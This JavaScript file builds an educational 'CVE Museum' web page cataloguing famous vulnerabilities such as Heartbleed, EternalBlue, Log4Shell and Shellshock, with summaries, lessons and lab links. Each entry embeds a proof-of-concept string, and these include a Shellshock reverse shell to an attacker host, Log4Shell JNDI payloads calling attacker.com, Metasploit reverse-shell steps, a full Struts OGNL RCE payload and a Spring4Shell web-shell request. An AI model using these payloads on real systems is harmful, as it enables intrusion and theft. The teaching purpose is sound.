/* ==================== CVE MUSEUM üèõÔ∏è ==================== */
/* Historical Vulnerability Archive - ŸÖÿ™ÿ≠ŸÅ ÿßŸÑÿ´ÿ∫ÿ±ÿßÿ™ */

window.CVEMuseum = {
    // === FAMOUS CVES DATABASE ===
    cves: [
        {
            id: 'CVE-2014-0160',
            name: 'Heartbleed',
            icon: 'üíî',
            year: 2014,
            severity: 'HIGH',
            cvss: 7.5,
            category: 'Memory Leak',
            affected: 'OpenSSL 1.0.1 - 1.0.1f',
            summary: 'Buffer over-read vulnerability in OpenSSL that allowed attackers to read up to 64KB of server memory per heartbeat request.',
            impact: 'Exposed private keys, session cookies, passwords, and sensitive data from millions of servers worldwide.',
            rootCause: 'Missing bounds check on heartbeat extension payload length in TLS implementation.',
            poc: `# Heartbleed PoC - Educational Only
# Check if server is vulnerable
nmap -p 443 --script ssl-heartbleed <target>

# Python PoC (simplified)
import socket
import struct

def heartbleed_test(host, port=443):
    """
    Tests for Heartbleed vulnerability
    CVE-2014-0160
    """
    # TLS Client Hello
    hello = bytes.fromhex(
        '16030200dc010000d8030253'
        '435b909d9b720bbc0cbc2b92'
        # ... handshake data
    )
    
    # Malicious Heartbeat (requests 64KB but sends 1 byte)
    heartbeat = bytes.fromhex(
        '18030200030140' + 'FF' * 16384
    )
    
    sock = socket.socket()
    sock.connect((host, port))
    sock.send(hello)
    # ... receive response
    sock.send(heartbeat)
    response = sock.recv(65535)
    
    if len(response) > 100:
        print("[!] VULNERABLE - Server returned memory!")
        return True
    return False`,
            docker: 'vulnerables/cve-2014-0160',
            video: 'https://www.youtube.com/watch?v=1dOCHwf8zVQ',
            whitepaper: 'https://heartbleed.com/',
            mitre: 'T1190',
            lesson: 'Always validate input length before copying data. Use safe memory functions.'
        },
        {
            id: 'CVE-2017-0144',
            name: 'EternalBlue',
            icon: 'üîµ',
            year: 2017,
            severity: 'CRITICAL',
            cvss: 9.8,
            category: 'SMB RCE',
            affected: 'Windows XP - Windows Server 2008 R2',
            summary: 'SMBv1 remote code execution vulnerability exploited by NSA and later leaked by Shadow Brokers. Used in WannaCry and NotPetya.',
            impact: 'Caused billions in damages through WannaCry ransomware. Affected hospitals, businesses, and governments worldwide.',
            rootCause: 'Buffer overflow in SMBv1 transaction handling, improper validation of transaction setup count.',
            poc: `# EternalBlue Exploitation - Educational Only
# Using Metasploit Framework

# 1. Start Metasploit
msfconsole

# 2. Use the EternalBlue module
use exploit/windows/smb/ms17_010_eternalblue

# 3. Set target
set RHOSTS <target_ip>

# 4. Set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>

# 5. Check if vulnerable
check

# 6. Exploit (in authorized environment only)
exploit

# Manual check with nmap
nmap -p445 --script smb-vuln-ms17-010 <target>`,
            docker: 'Windows VM required - No Docker available',
            video: 'https://www.youtube.com/watch?v=UBokJWN6lS4',
            whitepaper: 'https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010',
            mitre: 'T1210',
            lesson: 'Disable legacy protocols (SMBv1). Keep systems patched. Network segmentation is crucial.'
        },
        {
            id: 'CVE-2021-44228',
            name: 'Log4Shell',
            icon: 'üìù',
            year: 2021,
            severity: 'CRITICAL',
            cvss: 10.0,
            category: 'Java RCE',
            affected: 'Apache Log4j 2.0-2.14.1',
            summary: 'JNDI injection vulnerability in Log4j allowing remote code execution by logging a malicious string.',
            impact: 'Affected virtually every Java application using Log4j. Massive internet-wide exploitation within hours of disclosure.',
            rootCause: 'Log4j performed JNDI lookups on logged data, allowing attacker-controlled strings to trigger remote class loading.',
            poc: `# Log4Shell Exploitation - Educational Only

# 1. The vulnerable payload
\${jndi:ldap://attacker.com/exploit}

# 2. Where it can be injected:
# - User-Agent header
# - X-Forwarded-For
# - Any logged user input

# Example curl request
curl -H 'User-Agent: \${jndi:ldap://attacker.com/a}' \\
     https://vulnerable-app.com/

# Detection with nuclei
nuclei -t cves/2021/CVE-2021-44228.yaml -u target.com

# Python detection script
import requests

target = "https://vulnerable-app.com"
headers = {
    "User-Agent": "\${jndi:ldap://canary.burpcollaborator.net/a}",
    "X-Api-Version": "\${jndi:ldap://canary.burpcollaborator.net/a}"
}
requests.get(target, headers=headers)
# Check collaborator for DNS/HTTP callbacks`,
            docker: 'ghcr.io/christophetd/log4shell-vulnerable-app',
            video: 'https://www.youtube.com/watch?v=7qoPDq41xhQ',
            whitepaper: 'https://www.lunasec.io/docs/blog/log4j-zero-day/',
            mitre: 'T1190',
            lesson: 'Never process user input in logging frameworks. Use allowlists for JNDI lookups.'
        },
        {
            id: 'CVE-2014-6271',
            name: 'Shellshock',
            icon: 'üí•',
            year: 2014,
            severity: 'CRITICAL',
            cvss: 9.8,
            category: 'Bash RCE',
            affected: 'GNU Bash through 4.3',
            summary: 'Bash shell vulnerability allowing code execution through environment variables. Affected CGI scripts and SSH.',
            impact: 'Massive exploitation of web servers running CGI scripts. Used in botnets and cryptocurrency mining.',
            rootCause: 'Bash continued parsing commands after function definitions in environment variables.',
            poc: `# Shellshock Test - Educational Only

# 1. Local test
env x='() { :;}; echo VULNERABLE' bash -c "echo test"

# 2. CGI exploitation
curl -A "() { :; }; /bin/bash -c 'cat /etc/passwd'" \\
     http://target.com/cgi-bin/vulnerable.cgi

# 3. User-Agent based
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/attacker/4444 0>&1" \\
     http://target.com/cgi-bin/status

# 4. Nmap check
nmap -sV -p 80 --script http-shellshock \\
     --script-args uri=/cgi-bin/test.cgi target.com

# Python automated scanner
import requests

payloads = [
    "() { :; }; echo; /bin/cat /etc/passwd",
    "() { :;}; /bin/bash -c 'whoami'"
]

for payload in payloads:
    headers = {"User-Agent": payload}
    r = requests.get(target, headers=headers)
    if "root:" in r.text:
        print("[!] VULNERABLE")`,
            docker: 'vulnerables/cve-2014-6271',
            video: 'https://www.youtube.com/watch?v=aKShnpOXqn0',
            whitepaper: 'https://nvd.nist.gov/vuln/detail/CVE-2014-6271',
            mitre: 'T1059.004',
            lesson: 'Sanitize environment variables. Avoid CGI scripts. Use modern web frameworks.'
        },
        {
            id: 'CVE-2019-0708',
            name: 'BlueKeep',
            icon: 'üö™',
            year: 2019,
            severity: 'CRITICAL',
            cvss: 9.8,
            category: 'RDP RCE',
            affected: 'Windows XP - Windows 7, Server 2003-2008 R2',
            summary: 'Pre-authentication RCE in Remote Desktop Protocol. Wormable vulnerability similar to EternalBlue.',
            impact: 'Potentially wormable, could spread like WannaCry. Microsoft issued rare patches for XP.',
            rootCause: 'Use-after-free vulnerability in RDP channel MS_T120 handling.',
            poc: `# BlueKeep Check - Educational Only

# 1. Nmap vulnerability scan
nmap -p 3389 --script rdp-vuln-ms12-020,rdp-ntlm-info <target>

# 2. Metasploit scanner
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <target_range>
run

# 3. Metasploit exploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <target>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
exploit

# Python scanner (rdpscan)
# https://github.com/robertdavidgraham/rdpscan
./rdpscan <target_ip>`,
            docker: 'Windows VM required',
            video: 'https://www.youtube.com/watch?v=jHfo6XA6Tts',
            whitepaper: 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708',
            mitre: 'T1210',
            lesson: 'Disable RDP if not needed. Use NLA. Keep systems updated. Network segmentation.'
        },
        {
            id: 'CVE-2020-1472',
            name: 'ZeroLogon',
            icon: 'üîì',
            year: 2020,
            severity: 'CRITICAL',
            cvss: 10.0,
            category: 'AD Privilege Escalation',
            affected: 'Windows Server 2008 - 2019',
            summary: 'Netlogon cryptographic flaw allowing attackers to become Domain Admin in seconds.',
            impact: 'Complete Active Directory compromise. Attackers could take over entire corporate networks.',
            rootCause: 'AES-CFB8 implementation used all-zero IV, allowing authentication bypass with 1/256 probability.',
            poc: `# ZeroLogon Exploitation - Educational Only

# 1. Using Impacket (zerologon.py)
python3 zerologon_tester.py <DC_NETBIOS> <DC_IP>

# 2. Exploit to reset DC password
python3 cve-2020-1472-exploit.py <DC_NETBIOS> <DC_IP>

# 3. Dump secrets with empty hash
secretsdump.py -just-dc -no-pass <DOMAIN>/<DC_NETBIOS>\\$@<DC_IP>

# 4. Restore machine account (important!)
python3 restorepassword.py <DOMAIN>/<DC_NETBIOS>@<DC_NETBIOS> -target-ip <DC_IP>

# Detection:
# Event ID 4742 - Computer account changed
# Event ID 5805 - Netlogon authentication failure`,
            docker: 'Requires AD lab environment',
            video: 'https://www.youtube.com/watch?v=OGaK3JHJ9Hs',
            whitepaper: 'https://www.secura.com/pathtoimg.php?id=2055',
            mitre: 'T1557',
            lesson: 'Patch immediately. Monitor for Netlogon anomalies. Implement credential tiering.'
        },
        {
            id: 'CVE-2021-34527',
            name: 'PrintNightmare',
            icon: 'üñ®Ô∏è',
            year: 2021,
            severity: 'CRITICAL',
            cvss: 8.8,
            category: 'Windows Spooler RCE',
            affected: 'All Windows versions with Print Spooler',
            summary: 'Windows Print Spooler vulnerability allowing any authenticated user to become SYSTEM or Domain Admin.',
            impact: 'Trivial privilege escalation on any Windows system. Massively exploited in the wild.',
            rootCause: 'Print Spooler service improperly handled privileged file operations when installing printer drivers.',
            poc: `# PrintNightmare - Educational Only

# 1. Check if vulnerable
rpcdump.py @<target> | grep -i spooler

# 2. Using Impacket CVE-2021-1675.py
python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<TARGET> \\
    '\\\\<ATTACKER>\\share\\evil.dll'

# 3. Using Mimikatz
misc::printnightmare /server:<target> /library:\\\\attacker\\share\\evil.dll

# 4. PowerShell check
Get-Service -Name Spooler
Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint"

# Mitigation:
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled`,
            docker: 'Windows lab required',
            video: 'https://www.youtube.com/watch?v=_dluO4phjzU',
            whitepaper: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527',
            mitre: 'T1068',
            lesson: 'Disable Print Spooler on servers. Limit driver installation privileges.'
        },
        {
            id: 'CVE-2017-5638',
            name: 'Apache Struts RCE',
            icon: 'üè¢',
            year: 2017,
            severity: 'CRITICAL',
            cvss: 10.0,
            category: 'Web RCE',
            affected: 'Apache Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10',
            summary: 'Content-Type header parsing vulnerability leading to RCE. Used in the Equifax breach.',
            impact: 'Equifax data breach exposed 147 million people\'s personal data.',
            rootCause: 'OGNL injection through multipart parser exception handling in Content-Type header.',
            poc: `# Apache Struts RCE - Educational Only

# Payload in Content-Type header
curl -X POST \\
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \\
  http://target/struts2-showcase/

# Metasploit
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS <target>
set TARGETURI /struts2-showcase/
exploit`,
            docker: 'piesecurity/apache-struts2-cve-2017-5638',
            video: 'https://www.youtube.com/watch?v=RU7dsIYq-EQ',
            whitepaper: 'https://cwiki.apache.org/confluence/display/WW/S2-045',
            mitre: 'T1190',
            lesson: 'Keep frameworks updated. Use WAF rules. Input validation on all headers.'
        },
        {
            id: 'CVE-2018-7600',
            name: 'Drupalgeddon 2',
            icon: 'üíß',
            year: 2018,
            severity: 'CRITICAL',
            cvss: 9.8,
            category: 'CMS RCE',
            affected: 'Drupal 7.x before 7.58, 8.x before 8.5.1',
            summary: 'Unauthenticated remote code execution in Drupal through Form API.',
            impact: 'Widespread exploitation of Drupal sites. Cryptomining and defacement attacks.',
            rootCause: 'Drupal\'s Form API failed to properly sanitize certain form element keys.',
            poc: `# Drupalgeddon 2 - Educational Only

# Basic PoC request
curl -X POST \\
  "http://target/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \\
  -d "mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"

# Python exploitation
import requests

target = "http://drupal-site.com"
url = f"{target}/user/register"
params = {
    "element_parents": "account/mail/#value",
    "ajax_form": "1",
    "_wrapper_format": "drupal_ajax"
}
data = {
    "mail[#post_render][]": "exec",
    "mail[#type]": "markup", 
    "mail[#markup]": "id"
}
r = requests.post(url, params=params, data=data)
print(r.text)

# Metasploit
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS <target>
exploit`,
            docker: 'vulhub/drupal:8.5.0',
            video: 'https://www.youtube.com/watch?v=6R_CZk-LYnc',
            whitepaper: 'https://www.drupal.org/sa-core-2018-002',
            mitre: 'T1190',
            lesson: 'Update CMS immediately. Use WAF. Regular security audits.'
        },
        {
            id: 'CVE-2022-22965',
            name: 'Spring4Shell',
            icon: 'üå∏',
            year: 2022,
            severity: 'CRITICAL',
            cvss: 9.8,
            category: 'Java RCE',
            affected: 'Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19',
            summary: 'Class loader manipulation leading to RCE in Spring MVC applications running on JDK 9+.',
            impact: 'Affected many Java enterprise applications. Particularly dangerous in cloud environments.',
            rootCause: 'Spring data binding allowed modification of classLoader properties via carefully crafted requests.',
            poc: `# Spring4Shell - Educational Only

# 1. Exploit to write web shell
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=
%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i
&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=

# 2. Access web shell
GET /tomcatwar.jsp?pwd=j&cmd=id

# Nuclei scanner
nuclei -t cves/2022/CVE-2022-22965.yaml -u <target>`,
            docker: 'vulfocus/spring-cve_2022_22965',
            video: 'https://www.youtube.com/watch?v=lE0uUh6E1gA',
            whitepaper: 'https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement',
            mitre: 'T1190',
            lesson: 'Upgrade Spring Framework. Use allowlist for data binding. Monitor for suspicious patterns.'
        },
        {
            id: 'CVE-2019-11043',
            name: 'PHP-FPM RCE',
            icon: 'üêò',
            year: 2019,
            severity: 'CRITICAL',
            cvss: 9.8,
            category: 'PHP RCE',
            affected: 'PHP 7.1.x-7.3.x with nginx',
            summary: 'Buffer underflow in PHP-FPM allowing RCE against nginx+php-fpm configurations.',
            impact: 'Affected many LEMP stack deployments. Trivial to exploit with public tools.',
            rootCause: 'env_path_info underflow when fastcgi_split_path_info regex results in empty PATH_INFO.',
            poc: `# PHP-FPM RCE - Educational Only

# Using phuip-fpizdam exploit
go get github.com/neex/phuip-fpizdam
phuip-fpizdam http://target/index.php

# Manual detection - Check nginx config for:
# fastcgi_split_path_info ^(.+?\\.php)(/.*)$;
# Without: try_files $uri =404;

# After successful exploitation
curl "http://target/index.php?a=\$(id)"

# Vulnerable nginx configuration:
# location ~ [^/]\\.php(/|$) {
#     fastcgi_split_path_info ^(.+?\\.php)(/.*)$;
#     fastcgi_param PATH_INFO $fastcgi_path_info;
#     fastcgi_pass php:9000;
# }`,
            docker: 'vulhub/php:7.2-fpm',
            video: 'https://www.youtube.com/watch?v=uYj0VcLTpRU',
            whitepaper: 'https://github.com/neex/phuip-fpizdam',
            mitre: 'T1190',
            lesson: 'Always use try_files. Update PHP. Review nginx fastcgi configurations.'
        },
        {
            id: 'CVE-2023-44487',
            name: 'HTTP/2 Rapid Reset',
            icon: 'üåä',
            year: 2023,
            severity: 'HIGH',
            cvss: 7.5,
            category: 'DoS',
            affected: 'All HTTP/2 implementations',
            summary: 'Novel DDoS attack technique exploiting HTTP/2 stream cancellation. Record-breaking attacks observed.',
            impact: 'Largest DDoS attacks ever recorded - 398 million requests per second.',
            rootCause: 'HTTP/2 allows rapid stream creation and reset, consuming server resources without rate limiting.',
            poc: `# HTTP/2 Rapid Reset - Educational Only
# This is a DoS attack - NEVER test without authorization

# The attack concept:
# 1. Open HTTP/2 connection
# 2. Send HEADERS frame (new stream)
# 3. Immediately send RST_STREAM
# 4. Repeat thousands of times per connection

# Detection in logs:
# - High rate of stream resets
# - Many streams per connection
# - Rapid connection cycling

# Mitigation:
# - Rate limit streams per connection
# - Implement stream reset limits
# - Use HTTP/2 aware DDoS protection

# Check if vulnerable:
curl -v --http2 https://target.com 2>&1 | grep HTTP/2`,
            docker: 'Not applicable - DoS research',
            video: 'https://www.youtube.com/watch?v=nFkODy1FECs',
            whitepaper: 'https://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack',
            mitre: 'T1498',
            lesson: 'Implement HTTP/2 stream rate limiting. Use DDoS protection services.'
        }
    ],

    // === STATE ===
    activeTab: 'overview',
    selectedCVE: null,
    filters: { year: 'all', category: 'all', severity: 'all' },
    searchQuery: '',

    // === RENDER ===
    render() {
        return `
        <style>${this.getStyles()}</style>
        <div class="museum-container">
            ${this.renderHeader()}
            ${this.renderTimeline()}
            ${this.renderFilters()}
            <div class="museum-content">
                ${this.renderCVEGrid()}
            </div>
            ${this.renderModal()}
        </div>`;
    },

    renderHeader() {
        return `
        <div class="museum-header">
            <div class="museum-title">
                <i class="fas fa-landmark"></i>
                <span>CVE <span class="accent">Museum</span></span>
                <span class="subtitle">ŸÖÿ™ÿ≠ŸÅ ÿßŸÑÿ´ÿ∫ÿ±ÿßÿ™ - ÿßŸÑÿ™ÿßÿ±ŸäÿÆ ŸäÿπŸäÿØ ŸÜŸÅÿ≥Ÿá</span>
            </div>
            <div class="museum-search">
                <i class="fas fa-search"></i>
                <input type="text" id="cve-search" placeholder="Search CVEs..." 
                       oninput="CVEMuseum.onSearch(this.value)">
            </div>
        </div>`;
    },

    renderTimeline() {
        const years = [...new Set(this.cves.map(c => c.year))].sort();
        return `
        <div class="museum-timeline">
            <div class="timeline-track">
                ${years.map(year => {
            const cvesInYear = this.cves.filter(c => c.year === year);
            return `
                    <div class="timeline-point" onclick="CVEMuseum.filterByYear(${year})">
                        <div class="point-dot" style="--count: ${cvesInYear.length}"></div>
                        <div class="point-year">${year}</div>
                        <div class="point-count">${cvesInYear.length} CVE${cvesInYear.length > 1 ? 's' : ''}</div>
                    </div>`;
        }).join('')}
            </div>
        </div>`;
    },

    renderFilters() {
        const categories = [...new Set(this.cves.map(c => c.category))];
        return `
        <div class="museum-filters">
            <select id="filter-year" onchange="CVEMuseum.onFilter()">
                <option value="all">All Years</option>
                ${[...new Set(this.cves.map(c => c.year))].sort().map(y =>
            `<option value="${y}">${y}</option>`
        ).join('')}
            </select>
            <select id="filter-category" onchange="CVEMuseum.onFilter()">
                <option value="all">All Categories</option>
                ${categories.map(c => `<option value="${c}">${c}</option>`).join('')}
            </select>
            <select id="filter-severity" onchange="CVEMuseum.onFilter()">
                <option value="all">All Severities</option>
                <option value="CRITICAL">Critical</option>
                <option value="HIGH">High</option>
                <option value="MEDIUM">Medium</option>
            </select>
            <button class="reset-btn" onclick="CVEMuseum.resetFilters()">
                <i class="fas fa-undo"></i> Reset
            </button>
        </div>`;
    },

    renderCVEGrid() {
        const filtered = this.getFilteredCVEs();
        if (filtered.length === 0) {
            return `<div class="no-results"><i class="fas fa-search"></i> No CVEs match your search</div>`;
        }

        return `
        <div class="cve-grid">
            ${filtered.map(cve => this.renderCVECard(cve)).join('')}
        </div>`;
    },

    renderCVECard(cve) {
        const severityClass = cve.severity.toLowerCase();
        return `
        <div class="cve-card" onclick="CVEMuseum.openModal('${cve.id}')">
            <div class="cve-icon">${cve.icon}</div>
            <div class="cve-header">
                <h3>${cve.name}</h3>
                <span class="cve-id">${cve.id}</span>
            </div>
            <div class="cve-meta">
                <span class="cve-year"><i class="fas fa-calendar"></i> ${cve.year}</span>
                <span class="cve-cvss severity-${severityClass}">CVSS: ${cve.cvss}</span>
            </div>
            <p class="cve-summary">${cve.summary.substring(0, 120)}...</p>
            <div class="cve-tags">
                <span class="tag category">${cve.category}</span>
                <span class="tag severity-${severityClass}">${cve.severity}</span>
            </div>
            <div class="cve-actions">
                <span><i class="fas fa-code"></i> PoC</span>
                <span><i class="fas fa-play"></i> Video</span>
                <span><i class="fab fa-docker"></i> Lab</span>
            </div>
        </div>`;
    },

    renderModal() {
        return `
        <div class="museum-modal" id="cve-modal" onclick="if(event.target === this) CVEMuseum.closeModal()">
            <div class="modal-content" id="modal-content"></div>
        </div>`;
    },

    renderModalContent(cve) {
        const severityClass = cve.severity.toLowerCase();
        return `
        <button class="modal-close" onclick="CVEMuseum.closeModal()"><i class="fas fa-times"></i></button>
        
        <div class="modal-header">
            <div class="modal-icon">${cve.icon}</div>
            <div class="modal-title">
                <h2>${cve.name}</h2>
                <span class="modal-cve-id">${cve.id}</span>
            </div>
            <div class="modal-cvss severity-${severityClass}">
                <span class="cvss-score">${cve.cvss}</span>
                <span class="cvss-label">${cve.severity}</span>
            </div>
        </div>
        
        <div class="modal-tabs">
            <button class="tab-btn ${this.activeTab === 'overview' ? 'active' : ''}" 
                    onclick="CVEMuseum.switchTab('overview', '${cve.id}')">
                <i class="fas fa-info-circle"></i> Overview
            </button>
            <button class="tab-btn ${this.activeTab === 'poc' ? 'active' : ''}" 
                    onclick="CVEMuseum.switchTab('poc', '${cve.id}')">
                <i class="fas fa-code"></i> PoC Code
            </button>
            <button class="tab-btn ${this.activeTab === 'lab' ? 'active' : ''}" 
                    onclick="CVEMuseum.switchTab('lab', '${cve.id}')">
                <i class="fab fa-docker"></i> Lab
            </button>
            <button class="tab-btn ${this.activeTab === 'resources' ? 'active' : ''}" 
                    onclick="CVEMuseum.switchTab('resources', '${cve.id}')">
                <i class="fas fa-book"></i> Resources
            </button>
        </div>
        
        <div class="modal-body">
            ${this.renderTabContent(cve)}
        </div>`;
    },

    renderTabContent(cve) {
        switch (this.activeTab) {
            case 'overview':
                return `
                <div class="tab-overview">
                    <div class="overview-section">
                        <h4><i class="fas fa-bullseye"></i> Summary</h4>
                        <p>${cve.summary}</p>
                    </div>
                    <div class="overview-section">
                        <h4><i class="fas fa-exclamation-triangle"></i> Impact</h4>
                        <p>${cve.impact}</p>
                    </div>
                    <div class="overview-section">
                        <h4><i class="fas fa-bug"></i> Root Cause</h4>
                        <p>${cve.rootCause}</p>
                    </div>
                    <div class="overview-section">
                        <h4><i class="fas fa-server"></i> Affected Systems</h4>
                        <p>${cve.affected}</p>
                    </div>
                    <div class="overview-section lesson">
                        <h4><i class="fas fa-lightbulb"></i> Key Lesson</h4>
                        <p>${cve.lesson}</p>
                    </div>
                    <div class="overview-meta">
                        <span><i class="fas fa-calendar"></i> Year: ${cve.year}</span>
                        <span><i class="fas fa-layer-group"></i> Category: ${cve.category}</span>
                        <span><i class="fas fa-shield-alt"></i> MITRE: ${cve.mitre}</span>
                    </div>
                </div>`;

            case 'poc':
                return `
                <div class="tab-poc">
                    <div class="poc-warning">
                        <i class="fas fa-exclamation-triangle"></i>
                        <strong>‚ö†Ô∏è Educational Use Only!</strong>
                        <p>This code is for learning purposes. Only use in authorized environments.</p>
                    </div>
                    <div class="poc-code">
                        <div class="code-header">
                            <span>${cve.name} Exploit Code</span>
                            <button onclick="CVEMuseum.copyCode('${cve.id}')">
                                <i class="fas fa-copy"></i> Copy
                            </button>
                        </div>
                        <pre><code id="poc-${cve.id}">${this.escapeHtml(cve.poc)}</code></pre>
                    </div>
                </div>`;

            case 'lab':
                return `
                <div class="tab-lab">
                    <div class="lab-info">
                        <i class="fab fa-docker"></i>
                        <h4>Practice Lab</h4>
                        <p>Test this vulnerability in a safe, isolated environment.</p>
                    </div>
                    ${cve.docker.includes('docker') || cve.docker.includes('ghcr') || cve.docker.includes('vulhub') ? `
                    <div class="docker-command">
                        <code>docker run -d -p 80:80 ${cve.docker}</code>
                        <button onclick="navigator.clipboard.writeText('docker run -d -p 80:80 ${cve.docker}')">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="lab-steps">
                        <h5>Quick Start:</h5>
                        <ol>
                            <li>Install Docker on your system</li>
                            <li>Run the command above</li>
                            <li>Access <code>http://localhost</code></li>
                            <li>Follow the PoC steps to test the vulnerability</li>
                        </ol>
                    </div>
                    ` : `
                    <div class="lab-note">
                        <i class="fas fa-info-circle"></i>
                        <p>${cve.docker}</p>
                        <p>Consider using platforms like TryHackMe, HackTheBox, or VulnHub for practice.</p>
                    </div>
                    `}
                </div>`;

            case 'resources':
                return `
                <div class="tab-resources">
                    <a href="${cve.video}" target="_blank" class="resource-link video">
                        <i class="fab fa-youtube"></i>
                        <div>
                            <h5>Video Explanation</h5>
                            <p>Watch detailed walkthrough</p>
                        </div>
                        <i class="fas fa-external-link-alt"></i>
                    </a>
                    <a href="${cve.whitepaper}" target="_blank" class="resource-link paper">
                        <i class="fas fa-file-alt"></i>
                        <div>
                            <h5>Whitepaper / Advisory</h5>
                            <p>Original research and documentation</p>
                        </div>
                        <i class="fas fa-external-link-alt"></i>
                    </a>
                    <a href="https://attack.mitre.org/techniques/${cve.mitre}/" target="_blank" class="resource-link mitre">
                        <i class="fas fa-shield-alt"></i>
                        <div>
                            <h5>MITRE ATT&CK: ${cve.mitre}</h5>
                            <p>Technique mapping and detection</p>
                        </div>
                        <i class="fas fa-external-link-alt"></i>
                    </a>
                    <a href="https://nvd.nist.gov/vuln/detail/${cve.id}" target="_blank" class="resource-link nvd">
                        <i class="fas fa-database"></i>
                        <div>
                            <h5>NVD Entry</h5>
                            <p>Official vulnerability database</p>
                        </div>
                        <i class="fas fa-external-link-alt"></i>
                    </a>
                </div>`;
        }
    },

    // === INTERACTIONS ===
    openModal(cveId) {
        const cve = this.cves.find(c => c.id === cveId);
        if (!cve) return;

        this.selectedCVE = cve;
        this.activeTab = 'overview';

        const modal = document.getElementById('cve-modal');
        const content = document.getElementById('modal-content');
        content.innerHTML = this.renderModalContent(cve);
        modal.classList.add('open');
    },

    closeModal() {
        document.getElementById('cve-modal').classList.remove('open');
        this.selectedCVE = null;
    },

    switchTab(tab, cveId) {
        this.activeTab = tab;
        const cve = this.cves.find(c => c.id === cveId);
        document.getElementById('modal-content').innerHTML = this.renderModalContent(cve);
    },

    copyCode(cveId) {
        const code = document.getElementById(`poc-${cveId}`).textContent;
        navigator.clipboard.writeText(code);
        this.showNotification('Code copied!', 'success');
    },

    onSearch(query) {
        this.searchQuery = query.toLowerCase();
        this.refreshGrid();
    },

    onFilter() {
        this.filters.year = document.getElementById('filter-year').value;
        this.filters.category = document.getElementById('filter-category').value;
        this.filters.severity = document.getElementById('filter-severity').value;
        this.refreshGrid();
    },

    filterByYear(year) {
        document.getElementById('filter-year').value = year;
        this.filters.year = year.toString();
        this.refreshGrid();
    },

    resetFilters() {
        this.filters = { year: 'all', category: 'all', severity: 'all' };
        this.searchQuery = '';
        document.getElementById('filter-year').value = 'all';
        document.getElementById('filter-category').value = 'all';
        document.getElementById('filter-severity').value = 'all';
        document.getElementById('cve-search').value = '';
        this.refreshGrid();
    },

    getFilteredCVEs() {
        return this.cves.filter(cve => {
            if (this.filters.year !== 'all' && cve.year.toString() !== this.filters.year) return false;
            if (this.filters.category !== 'all' && cve.category !== this.filters.category) return false;
            if (this.filters.severity !== 'all' && cve.severity !== this.filters.severity) return false;
            if (this.searchQuery) {
                const search = this.searchQuery;
                return cve.name.toLowerCase().includes(search) ||
                    cve.id.toLowerCase().includes(search) ||
                    cve.summary.toLowerCase().includes(search) ||
                    cve.category.toLowerCase().includes(search);
            }
            return true;
        });
    },

    refreshGrid() {
        const grid = document.querySelector('.museum-content');
        if (grid) grid.innerHTML = this.renderCVEGrid();
    },

    showNotification(msg, type = 'info') {
        const notif = document.createElement('div');
        notif.className = `museum-notif ${type}`;
        notif.innerHTML = `<i class="fas fa-check-circle"></i> ${msg}`;
        document.body.appendChild(notif);
        setTimeout(() => notif.remove(), 2000);
    },

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    },

    // === STYLES ===
    getStyles() {
        return `
        .museum-container { min-height: 100vh; background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%); color: #fff; font-family: 'Rajdhani', sans-serif; padding: 20px; }
        
        .museum-header { display: flex; justify-content: space-between; align-items: center; padding: 20px 30px; background: rgba(0,0,0,0.4); border-radius: 15px; margin-bottom: 25px; flex-wrap: wrap; gap: 15px; }
        .museum-title { display: flex; align-items: center; gap: 15px; font-size: 1.8rem; font-weight: 700; }
        .museum-title i { color: #ffd700; font-size: 2rem; }
        .museum-title .accent { color: #ffd700; }
        .museum-title .subtitle { font-size: 0.9rem; color: rgba(255,255,255,0.5); margin-left: 15px; }
